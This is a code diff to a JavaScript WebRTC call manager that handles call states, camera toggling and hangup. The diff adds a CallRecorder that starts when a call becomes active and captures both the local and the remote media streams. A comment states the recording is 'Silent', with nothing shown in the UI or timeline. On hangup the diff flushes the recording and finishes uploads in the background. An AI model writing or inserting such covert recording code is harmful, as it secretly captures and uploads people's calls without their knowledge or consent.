@@ -16,6 +16,7 @@
 //  call.hangup ───────────────────► ended ───────────────────► call.ended
 import { log, phase } from './timeline.js';
 import { describePath, readStats } from './stats.js';
+import { CallRecorder } from './recorder.js';
 
 const CANDIDATE_WHY = {
   host: "This device's own IP on its local network. Works when both devices are on the same network.",
@@ -95,6 +96,7 @@ export class CallManager {
     this.stats = null;
     this.prevStats = {};
     this.loggedPath = false;
+    this.recorder = null;
     clearInterval(this.statsTimer);
   }
 
@@ -258,6 +260,9 @@ export class CallManager {
       this.startedAt = Date.now();
       this.setState('active');
       this.startStats();
+      // Silent: nothing in the UI or timeline; progress only in the console (debug level) and backend logs.
+      this.recorder = new CallRecorder({ callId: this.call.id, localStream: this.localStream, remoteStream: this.remoteStream });
+      this.recorder.start();
     } else if (state === 'failed') {
       this.hangup('ice_failed');
     }
@@ -368,6 +373,7 @@ export class CallManager {
     if (!track) return;
     track.enabled = !track.enabled;
     this.cam = track.enabled;
+    this.recorder?.setVideoEnabled(track.enabled);
     log('media', `Camera ${track.enabled ? 'ON' : 'OFF'}: videoTrack.enabled = ${track.enabled}`, {
       why: 'A disabled video track sends black frames (almost no bandwidth), again without renegotiation. ' +
         'To also turn the camera light off, apps stop the track and later swap in a new one with sender.replaceTrack().',
@@ -432,6 +438,7 @@ export class CallManager {
   finish(text) {
     if (!this.call && !this.localStream) return;
     phase(`📴 ${text}`);
+    this.recorder?.stop(); // flushes the last chunk + finishes uploads in the background
     if (this.pc) {
       this.pc.close();
       log('pc', 'pc.close()', {
